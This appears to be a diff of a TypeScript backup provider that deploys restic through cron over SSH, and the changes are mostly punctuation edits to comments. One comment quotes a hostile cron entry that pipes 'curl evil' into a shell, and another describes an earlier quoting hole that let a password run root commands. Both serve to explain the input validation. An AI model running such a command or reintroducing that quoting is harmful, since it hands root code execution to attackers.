@@ -18,7 +18,7 @@ const backupSchema = sshSchema.extend({
     credentials: z.record(z.string(), z.string()).default({}),
     // A crontab has no quoting whatsoever, so this field is guarded by SHAPE rather than escaped. Two ways it
     // would otherwise become "run anything, as root, on a schedule": a newline appends a whole cron entry, and
-    // a SIXTH field is already the command — `0 3 * * * curl evil|sh #` leaves the intended script commented
+    // a SIXTH field is already the command, `0 3 * * * curl evil|sh #` leaves the intended script commented
     // out behind a `#`. Exactly five fields of cron's own alphabet admits neither, and rejects at parse time
     // with the operator's typo named rather than at 3am on the host.
     schedule: z
@@ -38,7 +38,7 @@ const ENV_FILE = `${STATE_DIR}/restic.env`;
 const SCRIPT_FILE = `${STATE_DIR}/backup.sh`;
 const CRONTAB_FILE = `${STATE_DIR}/crontab`;
 // Inspecting labels (set at create time) is the observable truth for the schedule + repo; "|" is a safe
-// separator (cron has spaces, the repo may have ":" — neither contains "|").
+// separator (cron has spaces, the repo may have ":", neither contains "|").
 const SEP = "|";
 
 // The default on-host restic repo lives in this named volume, mounted into the backup + restore containers
@@ -59,7 +59,7 @@ const volumeMounts = (signoz: boolean): Record<string, string> => ({
 });
 
 // The backup script crond runs each tick, INSIDE the restic container (busybox sh). App-consistent dumps
-// first (best-effort — the read-only volume backup that follows is the fallback), then one restic snapshot of
+// first (best-effort, the read-only volume backup that follows is the fallback), then one restic snapshot of
 // the staging dumps + the mounted volumes + the host's /opt/intentic state dir, then a retention prune. The
 // repo + keep counts are baked in (so a config change rewrites this file and the diff reconciles); the
 // password + backend creds come from the --env-file restic.env. Written under a quoted heredoc so the host
@@ -79,7 +79,7 @@ const backupScript = (parsed: BackupInputs): string =>
         "PG=$(docker ps -q -f label=com.docker.compose.project=komodo -f label=com.docker.compose.service=postgres)",
         'if [ -n "$PG" ]; then docker exec "$PG" pg_dump -U komodo -d postgres > "$STAGING/komodo.sql"; else echo "komodo pg_dump skipped"; fi',
         // The on-host default repo is intentic-owned, so self-init it on first use (idempotent: skip when the
-        // repo config already reads). A remote repo is the operator's — left as-is (they pre-create it).
+        // repo config already reads). A remote repo is the operator's, left as-is (they pre-create it).
         ...(isLocalRepo(parsed.repo)
             ? [`restic -r ${shellQuote(parsed.repo)} cat config >/dev/null 2>&1 || restic -r ${shellQuote(parsed.repo)} init`]
             : []),
@@ -93,7 +93,7 @@ const running = async (session: SshSession): Promise<boolean> => {
     return result.stdout.trim() === CONTAINER;
 };
 
-// The create-time image + the schedule/repo labels — the observable config the diff converges on.
+// The create-time image + the schedule/repo labels, the observable config the diff converges on.
 const observe = async (session: SshSession): Promise<{ image: string; schedule: string; repo: string }> => {
     const result = await session.exec(
         `docker inspect --format '{{.Config.Image}}${SEP}{{index .Config.Labels "intentic.schedule"}}${SEP}{{index .Config.Labels "intentic.repo"}}' ${CONTAINER} 2>/dev/null || true`,
@@ -102,11 +102,11 @@ const observe = async (session: SshSession): Promise<{ image: string; schedule: 
     return { image, schedule, repo };
 };
 
-// Write restic.env ONCE (chmod 600 — the encryption password + backend creds must survive recreation, like
+// Write restic.env ONCE (chmod 600, the encryption password + backend creds must survive recreation, like
 // komodo's .env), always rewrite the script + crontab (so a schedule/repo/retention change reconciles).
 const ensureFiles = async (session: SshSession, parsed: BackupInputs): Promise<void> => {
     await session.exec(`mkdir -p ${STATE_DIR}`);
-    // Two layers, one call each. dockerEnvLine renders the file's line (raw — `docker run --env-file` keeps
+    // Two layers, one call each. dockerEnvLine renders the file's line (raw, `docker run --env-file` keeps
     // quotes as part of the value), shellQuote carries that line through the host shell as one printf argument.
     // The old form wrapped each line in bare `'…'`, so an apostrophe in a restic password or an S3 secret key
     // ended the quoting and ran the rest as a command on the host, as root, at deploy time.
@@ -145,7 +145,7 @@ const mountArgs = (parsed: BackupInputs, dockerBin: string): string => {
 // resource only when the container is up, surfacing the running image + schedule/repo labels; diff recreates
 // on any drift (real reconciled config); apply discovers the host docker CLI (the restic image has none),
 // writes the once-guarded secret env + the regenerated script/crontab, and (re)runs the container. delete
-// removes the container + host state but NEVER touches the restic repo — those snapshots are the user's data.
+// removes the container + host state but NEVER touches the restic repo, those snapshots are the user's data.
 export const createBackupProvider = (executor: SshExecutor = sshExecutor): Provider => ({
     read: async (inputs, ctx) => {
         const parsed = parse(inputs);
@@ -157,7 +157,7 @@ export const createBackupProvider = (executor: SshExecutor = sshExecutor): Provi
             return undefined;
         }
         try {
-            // observe is a single `|| true`'d inspect, safe on a stopped/absent container — issue it alongside
+            // observe is a single `|| true`'d inspect, safe on a stopped/absent container, issue it alongside
             // the running() gate and discard it when the container isn't up, saving a round-trip when it is.
             const [up, observed] = await Promise.all([running(session), observe(session)]);
             if (!up) {
@@ -212,7 +212,7 @@ export const createBackupProvider = (executor: SshExecutor = sshExecutor): Provi
         const session = await executor.connect(sshTarget(parseInputs(sshSchema, inputs, "backup")));
         try {
             // Remove the scheduler + host-side script/secret state. The restic repo and its snapshots are the
-            // user's data living off-host — intentic never deletes them.
+            // user's data living off-host, intentic never deletes them.
             await session.exec(`docker rm -f ${CONTAINER} 2>/dev/null || true`);
             await session.exec(`rm -rf ${STATE_DIR}`);
             ctx.log(`backup "${ctx.id}" removed; the restic repo and its snapshots are left untouched`);
